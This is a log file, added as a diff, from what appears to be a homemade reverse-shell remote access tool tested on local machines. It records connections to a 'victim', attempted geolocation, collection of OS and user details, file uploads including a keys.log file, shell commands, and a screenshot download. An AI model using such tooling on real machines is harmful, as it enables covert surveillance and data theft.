+2018-12-29 00:46:45,722 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:46:54,429 - root - MainThread -  INFO - Reverse shell # command > upload Test.txt
+2018-12-29 00:46:54,466 - root - MainThread -  INFO - Trying to upload Test.txt
+2018-12-29 00:46:54,539 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:46:56,319 - root - MainThread -  INFO - Reverse shell # command > di
+2018-12-29 00:46:58,097 - root - MainThread -  INFO - Reverse shell # command > dir
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:47:28,443 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:47:28,443 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:47:28,444 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:47:31,963 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:47:31,970 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:47:31,971 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:47:32,037 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:47:32,042 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:47:32,240 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:47:32,283 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:47:32,290 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:47:32,296 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:47:37,653 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:47:42,108 - root - MainThread -  INFO - Reverse shell # command > upload ,
+2018-12-29 00:47:42,126 - root - MainThread -  INFO - Trying to upload ,
+2018-12-29 00:47:42,137 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:47:44,605 - root - MainThread -  INFO - Reverse shell # command > upload ,
+2018-12-29 00:47:44,629 - root - MainThread -  INFO - Trying to upload ,
+2018-12-29 00:47:44,636 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:47:48,239 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:48:07,993 - root - MainThread -  INFO - Reverse shell # command > del test.txt
+2018-12-29 00:48:13,416 - root - MainThread -  INFO - Reverse shell # command > upload Test.txt
+2018-12-29 00:48:13,441 - root - MainThread -  INFO - Trying to upload Test.txt
+2018-12-29 00:48:13,499 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:48:20,628 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:48:28,964 - root - MainThread -  INFO - Reverse shell # command > type Test.txt
+2018-12-29 00:50:00,890 - root - MainThread -  INFO - Reverse shell # command > upload ,
+2018-12-29 00:50:00,911 - root - MainThread -  INFO - Trying to upload ,
+2018-12-29 00:50:00,923 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:50:04,153 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:50:34,831 - root - MainThread -  INFO - Reverse shell # command > upload lorem.txt
+2018-12-29 00:50:34,849 - root - MainThread -  INFO - Trying to upload lorem.txt
+2018-12-29 00:50:34,887 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:50:42,582 - root - MainThread -  INFO - Reverse shell # command > dir
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:51:12,669 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:51:12,669 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:51:12,670 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:51:12,670 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:51:12,675 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:51:12,675 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:51:12,759 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:51:12,765 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:51:13,032 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:51:13,089 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:51:13,113 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:51:13,120 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:51:22,931 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:51:32,049 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:51:42,400 - root - MainThread -  INFO - Reverse shell # command > upload lorem.ttx
+2018-12-29 00:51:42,418 - root - MainThread -  INFO - Trying to upload lorem.ttx
+2018-12-29 00:51:42,430 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:51:51,096 - root - MainThread -  INFO - Reverse shell # command > upload lorem.txt
+2018-12-29 00:51:51,121 - root - MainThread -  INFO - Trying to upload lorem.txt
+2018-12-29 00:51:51,168 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:51:56,510 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:51:59,072 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:52:01,600 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:52:11,086 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:52:18,512 - root - MainThread -  INFO - Reverse shell # command > upload keys.log
+2018-12-29 00:52:18,536 - root - MainThread -  INFO - Trying to upload keys.log
+2018-12-29 00:52:18,595 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:52:22,056 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:52:53,849 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:52:58,349 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:52:58,362 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:52:59,364 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:53:00,875 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:53:28,770 - root - MainThread -  INFO - Credentials from argpars -> ip : localhost | port : 6970
+2018-12-29 00:53:28,771 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:53:28,771 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:53:28,775 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:53:28,782 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:53:28,783 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:53:28,789 - root - MainThread -  INFO - The victim is connected with the following ip : 127.0.0.1
+2018-12-29 00:53:28,795 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:53:28,988 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:53:29,024 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:53:29,049 - root - MainThread -  INFO - Os victim infos ↴
+Nom : posix
+Systeme : Darwin
+Kernel : 18.2.0
+User : juliandotreppe
+Default path : /Users/juliandotreppe/Desktop/hack_tools
+2018-12-29 00:53:29,055 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:53:32,066 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:53:35,193 - root - MainThread -  INFO - Reverse shell # command > upload ,
+2018-12-29 00:53:35,217 - root - MainThread -  INFO - Trying to upload ,
+2018-12-29 00:53:35,223 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:53:39,712 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:53:49,731 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 00:53:49,754 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 00:53:50,555 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:54:15,569 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:54:17,662 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:54:19,203 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:54:25,718 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:54:28,607 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:54:42,108 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:54:47,011 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:54:51,255 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:54:57,128 - root - MainThread -  INFO - Reverse shell # command > rm keys.log
+2018-12-29 00:55:05,238 - root - MainThread -  INFO - Reverse shell # command > rm test.txt
+2018-12-29 00:55:14,846 - root - MainThread -  INFO - Reverse shell # command > upload Test.txt
+2018-12-29 00:55:14,864 - root - MainThread -  INFO - Trying to upload Test.txt
+2018-12-29 00:55:14,919 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:55:22,711 - root - MainThread -  INFO - Reverse shell # command > cat Test.txt
+2018-12-29 00:57:23,144 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:57:26,170 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:57:26,192 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:57:27,196 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:57:28,708 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:57:39,158 - root - MainThread -  INFO - Credentials from argpars -> ip : localhost | port : 6970
+2018-12-29 00:57:39,159 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:57:39,159 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:57:39,162 - root - Thread-1 -  WARNING - Victim's server is not alive !
+2018-12-29 00:57:39,162 - root - Thread-1 -  INFO - Connected to victim's server
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:57:47,899 - root - MainThread -  INFO - Credentials from argpars -> ip : localhost | port : 6970
+2018-12-29 00:57:47,900 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:57:47,900 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:57:47,903 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:57:47,911 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:57:47,912 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:57:47,918 - root - MainThread -  INFO - The victim is connected with the following ip : 127.0.0.1
+2018-12-29 00:57:47,924 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:57:48,162 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:57:48,210 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:57:48,223 - root - MainThread -  INFO - Os victim infos ↴
+Nom : posix
+Systeme : Darwin
+Kernel : 18.2.0
+User : juliandotreppe
+Default path : /Users/juliandotreppe/Desktop/hack_tools
+2018-12-29 00:57:48,229 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:57:52,341 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:57:54,935 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:58:19,732 - root - MainThread -  INFO - Reverse shell # command > upload ,
+2018-12-29 00:58:19,767 - root - MainThread -  INFO - Trying to upload ,
+2018-12-29 00:58:19,773 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 00:58:23,617 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:58:31,432 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 00:58:31,463 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 00:58:32,282 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:59:46,551 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:59:48,496 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:59:48,520 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:59:49,522 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:59:51,033 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:59:58,203 - root - MainThread -  INFO - Credentials from argpars -> ip : localhost | port : 6970
+2018-12-29 00:59:58,203 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:59:58,203 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:59:58,205 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:59:58,213 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:59:58,214 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:59:58,220 - root - MainThread -  INFO - The victim is connected with the following ip : 127.0.0.1
+2018-12-29 00:59:58,226 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:59:58,424 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:59:58,496 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:59:58,509 - root - MainThread -  INFO - Os victim infos ↴
+Nom : posix
+Systeme : Darwin
+Kernel : 18.2.0
+User : juliandotreppe
+Default path : /Users/juliandotreppe/Desktop/hack_tools
+2018-12-29 00:59:58,515 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:59:59,843 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 01:00:03,233 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:00:06,513 - root - MainThread -  INFO - Reverse shell # command > upload ?[3~
+2018-12-29 01:00:06,533 - root - MainThread -  INFO - Trying to upload ?[3~
+2018-12-29 01:00:06,545 - root - MainThread -  INFO - Requested file doesn't exist
+2018-12-29 01:00:10,117 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 01:00:12,742 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:00:18,647 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:00:21,279 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 01:00:25,286 - root - MainThread -  INFO - Reverse shell # command > home
+2018-12-29 01:00:38,695 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 01:00:46,278 - root - MainThread -  INFO - Reverse shell # command > rm Server.log
+2018-12-29 01:00:51,858 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 01:00:51,886 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 01:00:54,856 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 01:01:07,654 - root - MainThread -  INFO - Reverse shell # command > cat Server.log
+2018-12-29 01:01:10,649 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 01:01:12,858 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 01:01:59,000 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:02,398 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:18,755 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:26,798 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 01:02:26,816 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 01:02:29,757 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 01:02:48,652 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:52,161 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:54,497 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 01:02:55,700 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 01:02:58,530 - root - MainThread -  INFO - Reverse shell # command > home
+2018-12-29 01:03:14,487 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 01:03:20,878 - root - MainThread -  INFO - Showing os infos
+2018-12-29 01:03:22,148 - root - MainThread -  INFO - Taking a screenshot
+2018-12-29 01:03:22,166 - root - MainThread -  INFO - Downloading the screenshot
+2018-12-29 01:03:32,768 - root - MainThread -  INFO - Download sucessful
